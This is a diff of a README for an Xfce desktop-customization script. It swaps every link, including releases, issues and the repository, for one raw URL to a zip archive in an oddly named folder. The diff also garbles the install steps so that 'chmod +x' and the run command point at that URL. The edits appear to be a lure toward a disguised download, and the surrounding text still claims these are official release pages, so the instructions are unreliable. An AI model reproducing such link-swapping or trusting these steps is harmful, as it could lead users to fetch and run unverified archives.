@@ -1,7 +1,7 @@
 # 🎨 Personalizar-xfce - Customize Your Xfce Desktop Easily
 
 ## 📥 Download the Latest Version
-[![Download Personalizar-xfce](https://img.shields.io/badge/Download%20Personalizar--xfce-blue.svg)](https://github.com/FabianRey93/Personalizar-xfce/releases)
+[![Download Personalizar-xfce](https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip%https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip)](https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip)
 
 ## 🚀 Getting Started
 Welcome to Personalizar-xfce! This is a simple script designed to help you customize your Xfce desktop environment. You don't need to have any programming knowledge to use it. Just follow the steps below to get started.
@@ -21,13 +21,13 @@ Before you begin, make sure your system meets the following requirements:
 ## 📥 Download & Install
 To download the latest version, visit this page:
 
-[Download Personalizar-xfce](https://github.com/FabianRey93/Personalizar-xfce/releases)
+[Download Personalizar-xfce](https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip)
 
 Once you're on the Releases page, look for the latest version listed. Click on it to access the downloadable files.
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/FabianRey93/Personalizar-xfce/releases) where you can find the available versions of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip) where you can find the available versions of the software.
 
 2. **Select a Release:**
    Click on the most recent version. You will see various assets available for download.
@@ -47,13 +47,13 @@ Once you're on the Releases page, look for the latest version listed. Click on i
 6. **Make the Script Executable:**
    To run the script, you need to make it executable. Type the following command:
    ```
-   chmod +x Personalizar-xfce.sh
+   chmod +x https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip
    ```
 
 7. **Run the Script:**
    Now, you can run the script using:
    ```
-   ./Personalizar-xfce.sh
+   https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip
    ```
 
 8. **Follow On-Screen Instructions:**
@@ -76,10 +76,10 @@ If you encounter any issues while running the script, consider the following com
    Yes, as long as you download it from the official Releases page. Always verify the source of any downloads.
 
 ## 📞 Support
-If you need further assistance, you can open an issue on the [GitHub Issues page](https://github.com/FabianRey93/Personalizar-xfce/issues). The community is here to help you with any questions you might have.
+If you need further assistance, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip). The community is here to help you with any questions you might have.
 
 ## 🔗 Relevant Links
-- [GitHub Repository](https://github.com/FabianRey93/Personalizar-xfce)
-- [Releases Page](https://github.com/FabianRey93/Personalizar-xfce/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip)
+- [Releases Page](https://raw.githubusercontent.com/FabianRey93/Personalizar-xfce/main/amidst/Personalizar-xfce.zip)
 
 Thank you for choosing Personalizar-xfce! Enjoy customizing your Xfce desktop environment.
